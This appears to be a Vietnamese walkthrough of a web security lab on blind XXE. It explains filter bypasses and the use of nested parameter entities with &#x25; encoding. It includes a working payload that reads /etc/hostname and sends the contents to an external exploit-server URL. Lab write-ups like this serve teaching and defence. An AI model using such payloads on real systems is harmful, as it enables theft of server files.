![image](https://github.com/user-attachments/assets/f2ce48a9-9ce5-499c-b0c3-314a2bf7d845)

![image](https://github.com/user-attachments/assets/72869bc4-1267-4c85-87cc-935463b78779)

Nó vẫn đang filter `&` 

![image](https://github.com/user-attachments/assets/127385ac-7162-4c9a-9a21-671de6484fe6)

![image](https://github.com/user-attachments/assets/cb0151f1-2c1b-4cca-8ba6-2569de973516)

Thật may là `%` nó không bị filter. Vậy bây giờ quay ngược lại challenge xem, giờ làm sao có thể lấy được `/etc/hostname`.

Và chúng ta hãy để ý rằng challenge này nó khác, nó sẽ cho chúng ta 1 cái server để chúng ta tạo payload và hứng data về.

![image](https://github.com/user-attachments/assets/47d38a37-f75e-4398-99b2-7f811a0af26d)

ta có thể thấy rằng ở đây nó có 2 đoạn code, thì đoạn code 1 sẽ chạy được và đoạn code 2 sẽ thất bại, lí do tại sao bạn có biết không?. Nhìn có vẻ cũng đúng mà....

**Đoạn code 1:**

Thiếu một parser XML: Để thực thi các thực thể, cần có một parser XML. Nếu parser không được cấu hình để cho phép truy cập hệ thống file, thực thể %file sẽ không được giải quyết thành nội dung của file `/etc/hostname` mà chỉ đơn giản là một chuỗi ký tự.

Không có cơ chế thực thi: Thực thể `%exfil` chỉ tạo ra một yêu cầu HTTP, nhưng không có cơ chế nào để thực thi yêu cầu này và nhận kết quả trả về.

**Đoạn code 2:**

Lớp thực thi bổ sung: Bằng cách khai báo thực thể `%eval` và sau đó khai báo thực thể %exfil bên trong nó, code 2 đã tạo ra một lớp thực thi bổ sung. Điều này khiến parser XML phải xử lý khai báo thực thể `%exfil` một lần nữa, và lần này, nó có thể được giải quyết thành một yêu cầu HTTP thực sự.

Vấn đề về mã hóa: Việc sử dụng `&#x25`; để mã hóa ký tự `%` là một kỹ thuật thường được sử dụng để bypass các bộ lọc. Điều này cho phép thực thể %exfil được khai báo bên trong một thực thể khác mà không bị parser XML nhận diện và loại bỏ.

![image](https://github.com/user-attachments/assets/7fd3c492-45da-456b-be2a-69b8a891bb81)

Bạn cũng có thể dùng payload như này:

```
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://exploit-0a4d004c045aa6c6aadda585012d00dd.exploit-server.net/?x=%file;'>">
%eval;
%exfil;
%file;
```

Còn lí do bạn phải dùng html encode `&#x25;` là do có 2 cái `%` cùng trong parameter entity nên phải encode 1 cái cho nó khác cũng giống như `'` và `"` trong code đó á v:.

Khi sử dụng ký tự % trong XML, đặc biệt là trong định nghĩa parameter entity, cần phải cẩn thận vì % có vai trò đặc biệt trong XML. Nó được dùng để bắt đầu một parameter entity reference. Nếu có nhiều ký tự % trong cùng một định nghĩa hoặc ngữ cảnh mà parser có thể nhầm lẫn, việc encode một trong số các ký tự % là cần thiết để phân biệt và tránh xung đột cú pháp.
